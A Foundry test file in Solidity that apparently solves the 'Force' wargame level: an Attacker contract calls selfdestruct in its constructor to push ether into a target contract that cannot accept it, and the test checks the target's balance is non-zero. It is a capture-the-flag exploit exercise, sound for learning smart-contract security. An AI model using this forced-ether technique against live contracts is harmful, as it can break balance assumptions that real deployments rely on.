// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

contract ForceTest is Test {
    Force target;
    address player;

    function setUp() public {
        target = new Force();
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        new Attacker{value: 1}(address(target));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertGt(address(target).balance, 0, "balance should be non-zero");
    }
}

contract Attacker {
    constructor(address _target) payable {
        selfdestruct(payable(_target));
    }
}
